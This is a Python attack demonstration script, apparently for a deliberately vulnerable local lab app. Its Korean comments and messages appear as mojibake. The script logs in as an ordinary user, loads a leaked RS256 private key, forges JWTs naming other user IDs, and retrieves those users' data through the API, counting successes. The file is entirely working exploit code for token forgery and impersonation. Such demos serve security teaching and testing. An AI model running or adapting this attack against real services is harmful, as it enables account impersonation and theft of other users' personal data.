#!/usr/bin/env python3
"""
ì·¨ì•½ì  ê³µê²© ë°ëª¨ ìŠ¤í¬ë¦½íŠ¸
ì‹œë‚˜ë¦¬ì˜¤:
1. í•´ì»¤ê°€ ì •ìƒì ìœ¼ë¡œ ë¡œê·¸ì¸
2. íƒˆì·¨í•œ ì„œëª… í‚¤ë¡œ ë¡œê·¸ì¸ì‹œ ë°›ì€ í† í° ì •ë³´ë¥¼ ìˆ˜ì •í•˜ì—¬ ì¬ì„œëª…
3. ì¬ì„œëª…í•œ í‚¤ë¡œ íƒ€ì¸ì˜ ì •ë³´ í™•ì¸

ì°¸ê³ : ì„œëª… í‚¤ëŠ” ì´ë¯¸ í•´ì»¤ê°€ íšë“í–ˆë‹¤ê³  ê°€ì •
"""

import jwt
import requests
import json
from datetime import datetime, timedelta
from cryptography.hazmat.primitives import serialization
import os

# ì„¤ì •
BASE_URL = "http://localhost:5001"

# ê³µê²©ì ê³„ì •
ATTACKER_USERNAME = "alice"
ATTACKER_PASSWORD = "password123"

# ìœ ì¶œëœ ì„œëª… í‚¤ (í•´ì»¤ê°€ ì´ë¯¸ íšë“í–ˆë‹¤ê³  ê°€ì •)
LEAKED_PRIVATE_KEY_PATH = os.path.join(os.path.dirname(__file__), 'leaked_private_key.pem')

def load_leaked_private_key():
    """ìœ ì¶œëœ ê°œì¸í‚¤ ë¡œë“œ"""
    with open(LEAKED_PRIVATE_KEY_PATH, 'rb') as f:
        return serialization.load_pem_private_key(
            f.read(),
            password=None
        )

def step1_normal_login():
    """1ë‹¨ê³„: í•´ì»¤ê°€ ì •ìƒì ìœ¼ë¡œ ë¡œê·¸ì¸"""
    print("="*60)
    print("1ë‹¨ê³„: í•´ì»¤ê°€ ì •ìƒì ìœ¼ë¡œ ë¡œê·¸ì¸")
    print("="*60)
    
    # ì„¸ì…˜ ìƒì„±
    session = requests.Session()
    
    # ë¡œê·¸ì¸ ìš”ì²­
    login_data = {
        'username': ATTACKER_USERNAME,
        'password': ATTACKER_PASSWORD
    }
    
    response = session.post(f'{BASE_URL}/login', data=login_data, allow_redirects=False)
    
    if response.status_code == 302:
        print(f"âœ… ë¡œê·¸ì¸ ì„±ê³µ!")
        
        # ì‚¬ìš©ì ì •ë³´ í˜ì´ì§€ ì ‘ê·¼í•˜ì—¬ í† í° í™•ì¸
        user_response = session.get(f'{BASE_URL}/user/1')
        
        if user_response.status_code == 200:
            print("âœ… ì‚¬ìš©ì ì •ë³´ í˜ì´ì§€ ì ‘ê·¼ ì„±ê³µ")
            print("âœ… ì •ìƒ í† í° í™•ì¸ ì™„ë£Œ")
            
            return session
    else:
        print(f"âŒ ë¡œê·¸ì¸ ì‹¤íŒ¨: {response.status_code}")
        print(response.text)
        return None

def step2_extract_token_info(session):
    """2ë‹¨ê³„: ë¡œê·¸ì¸ì‹œ ë°›ì€ í† í° ì •ë³´ ì¶”ì¶œ"""
    print("\n" + "="*60)
    print("2ë‹¨ê³„: ë¡œê·¸ì¸ì‹œ ë°›ì€ í† í° ì •ë³´ ì¶”ì¶œ")
    print("="*60)
    
    # APIë¥¼ í†µí•´ í˜„ì¬ í† í° ì •ë³´ í™•ì¸ (ì„¸ì…˜ ì¿ í‚¤ ì‚¬ìš©)
    # API ì—”ë“œí¬ì¸íŠ¸ê°€ ì„¸ì…˜ë„ ì§€ì›í•˜ë„ë¡ ìˆ˜ì •ë¨
    response = session.get(f'{BASE_URL}/api/user/1')
    
    if response.status_code == 200:
        data = response.json()
        token_info = data.get('token_info', {})
        print("âœ… í† í° ì •ë³´ ì¶”ì¶œ ì„±ê³µ:")
        print(json.dumps(token_info, indent=2, ensure_ascii=False))
        return token_info
    else:
        print(f"âŒ í† í° ì¶”ì¶œ ì‹¤íŒ¨: {response.status_code}")
        print(response.text)
        return {}

def step3_modify_and_resign_token(original_token_info, target_user_id):
    """3ë‹¨ê³„: í† í° ìˆ˜ì • ë° ì¬ì„œëª…"""
    print("\n" + "="*60)
    print(f"3ë‹¨ê³„: í† í° ìˆ˜ì • ë° ì¬ì„œëª… (íƒ€ê²Ÿ ì‚¬ìš©ì ID: {target_user_id})")
    print("="*60)
    
    # ìœ ì¶œëœ ê°œì¸í‚¤ ë¡œë“œ
    private_key = load_leaked_private_key()
    print(f"ğŸ“ í•´ì»¤ê°€ ì´ë¯¸ íšë“í•œ ì„œëª… í‚¤ ë¡œë“œ ì™„ë£Œ")
    
    # íƒ€ê²Ÿ ì‚¬ìš©ì ì •ë³´ ì¡°íšŒ
    users_response = requests.get(f'{BASE_URL}/users')
    if users_response.status_code == 200:
        users = users_response.json()
        target_user = next((u for u in users if u['id'] == target_user_id), None)
        
        if not target_user:
            print(f"âŒ ì‚¬ìš©ì ID {target_user_id}ë¥¼ ì°¾ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.")
            return None
        
        print(f"ğŸ¯ íƒ€ê²Ÿ ì‚¬ìš©ì: {target_user['username']} (ID: {target_user_id})")
    
    # ì›ë³¸ í† í°ì˜ payloadë¥¼ ê¸°ë°˜ìœ¼ë¡œ ìˆ˜ì •
    now = datetime.utcnow()
    
    # í† í° payload ìˆ˜ì •
    modified_payload = {
        'user_id': target_user_id,  # íƒ€ê²Ÿ ì‚¬ìš©ìë¡œ ë³€ê²½
        'username': target_user['username'] if target_user else f'victim_{target_user_id}',
        'email': target_user['email'] if target_user else f'victim_{target_user_id}@example.com',
        'iat': int(now.timestamp()),
        'exp': int((now + timedelta(hours=24)).timestamp()),
        'iss': 'vulnerable-app'
    }
    
    print("\nğŸ“ ìˆ˜ì •ëœ í† í° payload:")
    print(json.dumps(modified_payload, indent=2, ensure_ascii=False))
    
    # ìœ ì¶œëœ í‚¤ë¡œ ì¬ì„œëª…
    fake_token = jwt.encode(modified_payload, private_key, algorithm='RS256')
    
    print(f"\nâœ… ì¬ì„œëª…ëœ í† í° ìƒì„± ì™„ë£Œ!")
    print(f"í† í° (ì²˜ìŒ 100ì): {fake_token[:100]}...")
    print(f"ì„œëª… í‚¤: ìœ ì¶œëœ ê°œì¸í‚¤ ì‚¬ìš© (ì´ë¯¸ í•´ì»¤ê°€ íšë“)")
    print(f"\nğŸ“‹ ìƒì„±ëœ í† í° (ì „ì²´):")
    print(f"{fake_token}")
    print(f"\nğŸ’¡ ì´ í† í°ì„ UIì˜ '4ë‹¨ê³„: ì§ì ‘ í† í° ì…ë ¥í•˜ì—¬ í…ŒìŠ¤íŠ¸'ì— ë¶™ì—¬ë„£ì–´ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.")
    print(f"   ë˜ëŠ” http://localhost:5001/attack-demo ì—ì„œ '2ë‹¨ê³„'ë¥¼ ì‚¬ìš©í•˜ì—¬ í† í°ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.")
    
    return fake_token

def step4_access_victim_info(fake_token, target_user_id):
    """4ë‹¨ê³„: ì¬ì„œëª…í•œ í† í°ìœ¼ë¡œ íƒ€ì¸ ì •ë³´ ì ‘ê·¼"""
    print("\n" + "="*60)
    print(f"4ë‹¨ê³„: ì¬ì„œëª…í•œ í† í°ìœ¼ë¡œ íƒ€ì¸ ì •ë³´ ì ‘ê·¼ (ì‚¬ìš©ì ID: {target_user_id})")
    print("="*60)
    
    headers = {
        'Authorization': f'Bearer {fake_token}'
    }
    
    # APIë¥¼ í†µí•´ íƒ€ê²Ÿ ì‚¬ìš©ì ì •ë³´ ì ‘ê·¼
    response = requests.get(f'{BASE_URL}/api/user/{target_user_id}', headers=headers)
    
    if response.status_code == 200:
        user_data = response.json()
        print("âœ… ê³µê²© ì„±ê³µ! íƒ€ê²Ÿ ì‚¬ìš©ì ì •ë³´ ìœ ì¶œ:")
        print(json.dumps(user_data, indent=2, ensure_ascii=False))
        return True
    else:
        print(f"âŒ ê³µê²© ì‹¤íŒ¨: {response.status_code}")
        print(response.text)
        return False

def exploit_multiple_victims():
    """ì—¬ëŸ¬ í”¼í•´ì ê³µê²© ì‹œë®¬ë ˆì´ì…˜"""
    print("="*60)
    print("ì·¨ì•½í•œ ì¸ì¦ ì‹œìŠ¤í…œ ê³µê²© ë°ëª¨")
    print("ì‹œë‚˜ë¦¬ì˜¤: ì •ìƒ ë¡œê·¸ì¸ â†’ í† í° ìˆ˜ì • â†’ ì¬ì„œëª… â†’ íƒ€ì¸ ì •ë³´ ì ‘ê·¼")
    print("="*60)
    
    # 1ë‹¨ê³„: ì •ìƒ ë¡œê·¸ì¸
    session = step1_normal_login()
    if not session:
        print("\nâŒ ë¡œê·¸ì¸ ì‹¤íŒ¨ë¡œ ê³µê²© ì¤‘ë‹¨")
        return
    
    # 2ë‹¨ê³„: í† í° ì •ë³´ ì¶”ì¶œ
    original_token_info = step2_extract_token_info(session)
    
    if not original_token_info:
        print("\nâŒ í† í° ì¶”ì¶œ ì‹¤íŒ¨ë¡œ ê³µê²© ì¤‘ë‹¨")
        return
    
    # ì—¬ëŸ¬ ì‚¬ìš©ì ê³µê²©
    success_count = 0
    for target_id in [2, 3, 4, 5]:
        print(f"\n{'='*60}")
        print(f"íƒ€ê²Ÿ ì‚¬ìš©ì ID: {target_id} ê³µê²© ì‹œì‘")
        print('='*60)
        
        # 3ë‹¨ê³„: í† í° ìˆ˜ì • ë° ì¬ì„œëª…
        fake_token = step3_modify_and_resign_token(original_token_info, target_id)
        
        if fake_token:
            # 4ë‹¨ê³„: íƒ€ì¸ ì •ë³´ ì ‘ê·¼
            if step4_access_victim_info(fake_token, target_id):
                success_count += 1
    
    print(f"\n{'='*60}")
    print(f"ğŸ“Š ê³µê²© ê²°ê³¼: {success_count}/4 ì„±ê³µ")
    print("="*60)

if __name__ == '__main__':
    exploit_multiple_victims()

